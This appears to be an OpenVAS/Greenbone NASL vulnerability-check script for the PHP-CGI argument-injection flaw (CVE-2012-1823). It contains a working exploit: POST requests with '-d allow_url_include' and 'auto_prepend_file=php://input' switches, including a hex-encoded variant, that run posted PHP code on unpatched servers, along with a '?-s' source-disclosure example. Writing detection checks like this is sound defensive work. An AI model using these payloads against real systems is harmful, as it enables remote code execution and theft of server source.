if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103482" );
	script_version( "2021-04-13T14:13:08+0000" );
	script_bugtraq_id( 53388 );
	script_cve_id( "CVE-2012-1823", "CVE-2012-2311", "CVE-2012-2336", "CVE-2012-2335" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-13 14:13:08 +0000 (Tue, 13 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-05-04 10:40:34 +0100 (Fri, 04 May 2012)" );
	script_name( "PHP-CGI-based setups vulnerability when parsing query string parameters from php files." );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "gb_php_http_detect.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.h-online.com/open/news/item/Critical-open-hole-in-PHP-creates-risks-Update-1567532.html" );
	script_xref( name: "URL", value: "http://www.kb.cert.org/vuls/id/520827" );
	script_xref( name: "URL", value: "http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" );
	script_xref( name: "URL", value: "https://bugs.php.net/bug.php?id=61910" );
	script_xref( name: "URL", value: "http://www.php.net/manual/en/security.cgi-bin.php" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/53388" );
	script_tag( name: "summary", value: "PHP is prone to an information-disclosure vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response." );
	script_tag( name: "insight", value: "When PHP is used in a CGI-based setup (such as Apache's mod_cgid), the
  php-cgi receives a processed query string parameter as command line arguments which allows command-line
  switches, such as -s, -d or -c to be passed to the php-cgi binary, which can be exploited to disclose
  source code and obtain arbitrary code execution.

  An example of the -s command, allowing an attacker to view the source code of index.php is below:

  http://example.com/index.php?-s" );
	script_tag( name: "impact", value: "Exploiting this issue allows remote attackers to view the source code of files in the
  context of the server process. This may allow the attacker to obtain sensitive information and to run arbitrary PHP code
  on the affected computer. Other attacks are also possible." );
	script_tag( name: "solution", value: "PHP has released version 5.4.3 and 5.3.13 to address this vulnerability.
  PHP is recommending that users upgrade to the latest version of PHP." );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_timeout( 600 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( dont_add_port: TRUE );
_phps = http_get_kb_file_extensions( port: port, host: host, ext: "php" );
if( !isnull( _phps ) ){
	_phps = make_list( "/",
		 "/index.php",
		 _phps );
}
else {
	_phps = make_list( "/",
		 "/index.php" );
}
_phps = make_list( "/cgi-bin/php",
	 "/cgi-bin/php4",
	 "/cgi-bin/php4-cgi",
	 "/cgi-bin/php4.cgi",
	 "/cgi-bin/php5",
	 "/cgi-bin/php5-cgi",
	 "/cgi-bin/php5.cgi",
	 "/cgi-bin/php-cgi",
	 "/cgi-bin/php.cgi",
	 "/cgi/php",
	 "/cgi/php4",
	 "/cgi/php4-cgi",
	 "/cgi/php4.cgi",
	 "/cgi/php5",
	 "/cgi/php5-cgi",
	 "/cgi/php5.cgi",
	 "/cgi/php-cgi",
	 "/cgi/php.cgi",
	 "/php",
	 "/php4",
	 "/php4.cgi",
	 "/php5",
	 "/php5.cgi",
	 "/php.cgi",
	 _phps );
_phps = nasl_make_list_unique( _phps );
phpinfos = get_kb_list( "php/phpinfo/" + host + "/" + port + "/detected_urls" );
phps = make_list();
if( phpinfos ){
	for p in _phps {
		exist = FALSE;
		for pi in phpinfos {
			if(p == pi){
				exist = TRUE;
			}
			break;
		}
		if(!exist){
			phps = make_list( phps,
				 p );
		}
	}
}
else {
	phps = _phps;
}
max = 10;
count = 1;
post_data = "<?php phpinfo();?>";
post_urls[i++] = "-dallow_url_include%3don+-dauto_prepend_file%3dphp://input";
post_urls[i++] = "%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64" + "+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%7" + "3%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%7" + "5%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%7" + "2%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%6" + "5%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5" + "F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%7" + "4%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E";
host = http_host_name( port: port );
for php in phps {
	for post_url in post_urls {
		url = php + "?" + post_url;
		req = http_post_put_req( port: port, url: url, data: post_data, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
		res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(!res){
			continue;
		}
		if(found = egrep( string: res, pattern: "<title>phpinfo\\(\\)</title>", icase: FALSE )){
			info["\"HTTP POST\" body"] = post_data;
			info["URL"] = http_report_vuln_url( port: port, url: url, url_only: TRUE );
			report = "By doing the following HTTP POST request:\n\n";
			report += text_format_table( array: info ) + "\n\n";
			report += "it was possible to execute the \"" + post_data + "\" command.";
			report += "\n\nResult: " + chomp( found );
			expert_info = "Request:\n" + req + "Response:\n" + res;
			security_message( port: port, data: report, expert_info: expert_info );
			exit( 0 );
		}
	}
	count++;
	if(count >= max){
		exit( 99 );
	}
}
exit( 99 );

